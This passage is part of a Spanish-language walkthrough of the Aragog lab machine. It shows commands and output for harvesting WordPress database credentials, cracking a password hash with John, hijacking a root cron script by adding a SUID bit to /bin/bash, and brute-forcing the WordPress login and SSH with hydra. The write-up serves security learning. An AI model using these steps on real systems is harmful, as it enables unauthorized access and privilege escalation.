         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\

    |                             Do you like PEASS?                                  |                
    |---------------------------------------------------------------------------------|                
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                
    |         Follow on Twitter         :     @hacktricks_live                        |                
    |         Respect on HTB            :     SirBroccoli                             |                
    |---------------------------------------------------------------------------------|                
    |                                 Thank you!                                      |                
    \---------------------------------------------------------------------------------/                
          LinPEAS-ng by carlospolop                                                                    
                                                                                                       
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                           
                                                                                                       
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist                                                                                                     
 LEGEND:                                                                                               
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data www-data 2381 Mar 31  2021 /usr/share/wordpress/wp-config.php                    
$debian_server = preg_replace('/:.*/', "", $_SERVER['HTTP_HOST']);
if (!defined('DB_NAME'))
    define('DB_NAME', 'wordpress');
if (!defined('DB_USER'))
    define('DB_USER', 'wordpress');
if (!defined('DB_HOST'))
    define('DB_HOST', 'localhost')

╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 348 Nov 25  2020 /usr/share/man/man1/wsrep_sst_mariabackup.1.gz                 
-rw-r--r-- 1 www-data www-data 2983 Mar 31  2021 /usr/share/wordpress/wp-content/plugins/wp-file-manager/classes/files-backup.php
-rw-r--r-- 1 www-data www-data 11600 Mar 31  2021 /usr/share/wordpress/wp-content/plugins/wp-file-manager/classes/db-backup.php
-rw-r--r-- 1 www-data www-data 26419 Mar 31  2021 /usr/share/wordpress/wp-content/plugins/wp-file-manager/inc/backup.php
-rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup
-rw-r--r-- 1 root root 9731 Mar 19  2021 /usr/lib/modules/4.19.0-16-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
-rwxr-xr-x 1 hagrid98 hagrid98 81 Apr  1  2021 /opt/.backup.sh

╔══════════╣ Searching passwords in config PHP files
/etc/wordpress/config-default.php:define('DB_PASSWORD', '...');                               
/etc/wordpress/config-default.php:define('DB_USER', 'root');
/usr/share/wordpress/wp-admin/setup-config.php: $pwd = trim( wp_unslash( $_POST[ 'pwd' ] ) );
/usr/share/wordpress/wp-admin/setup-config.php: define('DB_PASSWORD', $pwd);
/usr/share/wordpress/wp-admin/setup-config.php: define('DB_USER', $uname);
/usr/share/wordpress/wp-config-sample.php:define('DB_PASSWORD', 'password_here');
/usr/share/wordpress/wp-config-sample.php:define('DB_USER', 'username_here');
/usr/share/wordpress/wp-config.php:    define('DB_USER', 'wordpress');
```
Únicamente puse lo que se me hizo interesante.

Encontró la ruta del `wp-config.php`, esta puede contener el usuario y contraseña del admin de **WordPress**.

En los archivos BackUp, me da curiosidad ese archivo llamado `/opt/.backup.sh`. Lo analizaremos más adelante.

Por último, el archivo `/etc/wordpress/config-default.php` contiene un usuario y contraseña para la base de datos de **WordPress** que en este caso sería el **MySQL**.

### Enumerando Base de Datos de WordPress en MySQL y Crackeando Hash de Contraseña del Usuario Encontrado {#MySQL}

Entremos y veamos qué bases de datos existen:
```bash
www-data@Aragog:/home$ mysql -u "root" -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 94
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+

| Database           |
+--------------------+

| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
+--------------------+
4 rows in set (0.006 sec)
```

Usemos la base de datos de **WordPress** y veamos sus tablas:
```bash
MariaDB [(none)]> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress]> show tables;
+-----------------------+

| Tables_in_wordpress   |
+-----------------------+

| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
| wp_wpfm_backup        |
+-----------------------+
13 rows in set (0.000 sec)
```

Ahora, veamos el contenido de la tabla **wp_users**:
```bash
MariaDB [wordpress]> select * from wp_users;      
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+

| ID | user_login | user_pass                          | user_nicename | user_email               | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+

|  1 | hagrid98   | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. | wp-admin      | hagrid98@localhost.local |          | 2021-03-31 14:21:02 |                     |           0 | WP-Admin     |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.000 sec)
```
Muy bien, tenemos el hash de la contraseña del usuario hagrid98.

Vamos a copiarlo y a crackearlo con la herramienta **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash_Hagrid
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 SSE2 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
....      (?)     
1g 0:00:00:00 DONE (2024-11-06 15:25) 11.11g/s 16000p/s 16000c/s 16000C/s camilo..michel
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```
Qué basura de contraseña puso hagrid.

Comprobemos si la contraseña es correcta:
```bash
www-data@Aragog:/home$ su hagrid98
Password: 
hagrid98@Aragog:/home$ whoami
hagrid98
```
Hemos obtenido acceso al usuario **hagrid98**.

### Utilizando pspy64 para Ver Procesos en Ejecución y Escalando Privilegios con Binario de hagrid98 {#Privesc}

Vamos a usar la herramienta **pspy64**, para ver si hay algún proceso en segundo plano del que nos podamos aprovechar.

Descárgalo de este link:
* <a href="https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1" target="_blank">Repositorio de DominicBreuker: pspy - Releases</a>

Una vez que lo descargues, lo pasamos a la máquina víctima. 

Activa un servidor en **Python** y con **wget** lo descargamos:
```bash
hagrid98@Aragog:~$ wget http://Tu_IP/pspy64
--2024-11-07 03:10:04--  http://Tu_IP/pspy64
Connecting to Tu_IP:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’
pspy64  0%[  
pspy64  100%[===================================================>]   2.96M  --.-KB/s    in 0.04s   

2024-11-07 03:10:04 (67.1 MB/s) - ‘pspy64’ saved [3104768/3104768]

hagrid98@Aragog:~$ ls
horcrux1.txt  pspy64
hagrid98@Aragog:~$ chmod +x pspy64
```

Ejecuta **pspy64**:
```bash
hagrid98@Aragog:~$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2024/11/07 03:10:17 CMD: UID=1000  PID=15044  | ./pspy64 
2024/11/07 03:10:17 CMD: UID=1000  PID=14972  | bash 
2024/11/07 03:10:17 CMD: UID=1000  PID=14963  | (sd-pam) 
2024/11/07 03:10:17 CMD: UID=1000  PID=14962  | /lib/systemd/systemd --user 

2024/11/07 03:10:17 CMD: UID=0     PID=1      | /sbin/init 
2024/11/07 03:12:01 CMD: UID=0     PID=15052  | /usr/sbin/CRON -f 
2024/11/07 03:12:01 CMD: UID=0     PID=15053  | /usr/sbin/CRON -f 
2024/11/07 03:12:01 CMD: UID=0     PID=15054  | /bin/sh -c bash -c "/opt/.backup.sh" 
2024/11/07 03:12:01 CMD: UID=0     PID=15055  | /bin/bash /opt/.backup.sh
```
Observa que es el binario que encontró **linPEAS** dentro de los archivos BackUp.

Veamos su contenido:
```
hagrid98@Aragog:~$ cat /opt/.backup.sh
#!/bin/bash

cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads
```

Parece que está copiando el directorio `/usr/share/wordpress/wp-content/uploads/` en un directorio temporal dentro de `/tmp`.

Veamos qué hay en `/tmp`:
```bash
hagrid98@Aragog:~$ ls -la /tmp
total 40
drwxrwxrwt 10 root root 4096 Nov  8 01:42 .
drwxr-xr-x 18 root root 4096 Mar 31  2021 ..
drwxrwxrwt  2 root root 4096 Nov  8 01:37 .font-unix
drwxrwxrwt  2 root root 4096 Nov  8 01:37 .ICE-unix
drwx------  3 root root 4096 Nov  8 01:37 systemd-private-4eb54db8a7204b619c98163f96a7cb2a-apache2.service-x0o998
drwx------  3 root root 4096 Nov  8 01:37 systemd-private-4eb54db8a7204b619c98163f96a7cb2a-systemd-timesyncd.service-hvECzu
drwxrwxrwt  2 root root 4096 Nov  8 01:37 .Test-unix
drwxr-xr-x  6 root root 4096 Nov  8 01:40 tmp_wp_uploads
drwxrwxrwt  2 root root 4096 Nov  8 01:37 .X11-unix
drwxrwxrwt  2 root root 4096 Nov  8 01:37 .XIM-unix
```

Lo curioso es que el directorio `/tmp` es del usuario **root**, por lo que entiendo que únicamente podría hacer esta acción de copiar un directorio dentro de `/tmp`, si tiene los permisos del **root**.

Vamos a usar este script para cambiar los permisos de la **Bash** para que cualquiera lo pueda ejecutar.

Vemos los permisos de la **Bash**:
```bash
hagrid98@Aragog:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

Modifiquemos el script:
```bash
#!/bin/bash

cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads
chmod u+s /bin/bash
```

Esperamos unos momentos y revisamos otra vez los permisos de la **Bash**:
```bash
hagrid98@Aragog:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

Muy bien, ya solo entramos a la **Bash** y obtenemos la última flag:
```bash
hagrid98@Aragog:~$ bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# ls
horcrux2.txt
bash-5.0# cat horcrux2.txt 
  ____                            _         _       _   _                 
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 

| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/

                  |___/                                                   

Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Easy
Machine Name: Aragog 
Horcruxes Hidden in this VM: 2 horcruxes

You have successfully pwned Aragog machine.
Here is your second hocrux: horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}

# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com
```
Con esto, completamos la máquina.

Veamos qué dicen los horocruxes:
```bash
# Horocrux 1:
echo -n "MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==" | base64 -d
1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets                                                                                                                                                                                                                 

# Horocrux 2:
echo -n "MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=" | base64 -d
2: maRvoLo GaUnt's riNg deStrOyed bY DUmbledOre
```
Completado.

### Aplicando Fuerza Bruta a Login de WordPress y a Servicio SSH {#FuerzaBruta}

En el caso de que hayamos encontrado un usuario que existe en **WordPress** o en el **servicio SSH**, podemos aplicarle fuerza bruta con la herramienta **hydra**.

Digamos que tenemos el usuario hagrid98 y sabemos que existe en **WordPress**.

Entonces, vamos a aplicarle fuerza bruta al login de **WordPress** (comúnmente es **wp-login.php**) para ver si podemos obtener su contraseña. Haremos esto con el **RIESGO DE BLOQUEAR AL USUARIO**.

Para hacerlo, captura una petición del login para ver cómo se representa la data enviada. Puedes hacerlo con **BurpSuite**:

<p align="center">
<img src="/assets/images/vulnhub-writeup-aragog/Captura6.png">
</p>

Esa data que representa al login, la usaremos dentro de **hydra** para que entienda que es ahí donde aplicará la fuerza bruta.

Ya solamente le indicaríamos el usuario, el wordlist que va a usar, la IP, el tipo de petición (en este caso **POST**), la data y le debemos agregar al final que solo considere las redirecciones como intentos exitosos (**código de estado 302** para redirecciones, lo que ocurre cuando pasamos un login):
```bash
hydra -l hagrid98 -P /usr/share/wordlists/rockyou.txt 192.168.1.005 http-post-form "/blog/wp-login.php:log=hagrid98&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.1.005%2Fblog%2Fwp-admin%2F&in%2F&testcookie=1:S=302"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-06 15:59:34
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.1.005:80/blog/wp-login.php:log=hagrid98&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.1.005%2Fblog%2Fwp-admin%2F&testcookie=1:S=302
[80][http-post-form] host: 192.168.1.005   login: hagrid98   password: ....
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-06 16:00:04
```
Excelente, obtuvo la contraseña de **hagrid98**.

De igual forma, podemos aplicar al **servicio SSH**; solamente le indicamos al final el tipo de servicio al que va el ataque:
```bash
hydra -l hagrid98 -P /usr/share/wordlists/rockyou.txt 192.168.1.005 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-06 16:02:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.1.005:22/
[STATUS] 238.00 tries/min, 238 tries in 00:01h, 14344163 to do in 1004:30h, 14 active
[STATUS] 222.67 tries/min, 668 tries in 00:03h, 14343733 to do in 1073:38h, 14 active
[22][ssh] host: 192.168.1.005   login: hagrid98   password: ....
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-06 16:09:05
```
Una vez más, obtuvo la contraseña del **usuario hagrid98**.
